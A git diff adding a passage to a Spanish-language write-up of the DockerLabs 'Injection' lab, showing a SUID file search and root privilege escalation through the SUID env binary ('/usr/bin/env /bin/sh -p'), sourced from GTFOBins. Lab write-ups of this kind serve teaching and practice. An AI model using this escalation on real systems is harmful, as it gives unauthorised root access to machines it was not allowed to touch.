@@ -190,4 +190,12 @@ dylan@127ef1d0b8b9:~$ find / -type f -perm -4000 2>/dev/null
 /usr/bin/passwd
 ```
 De todos estos archivos el más explotable es ``/usr/bin/env puesto que con env podemos ejecutar un programa con un entorno modificado.  Para encontrar alguna vulnerabilidad en este binario ejecutable podemos dirigirnos a [GTFOBins](https://gtfobins.github.io/gtfobins/env/#shell) y buscar en el binario correspondiente, en este caso *env*.
-[GTFOBins]()
+![GTFOBins](https://github.com/JavieRR13/WriteUps/blob/d738cb02fe305e99383dda7ef1e019a55be6125c/DockerLabs/Injection/Im%C3%A1genes/Injection_GTOBins_env.png)
+
+En nuestro caso nos interesa el apartado de SUID, por lo que nos dirigiremos a la terminal y probaremos el comando aportado.
+```ruby
+dylan@127ef1d0b8b9:~$ /usr/bin/env /bin/sh -p
+# whoami
+root
+```
+🥳CONSEGUIDO, SOMOS ROOT🥳
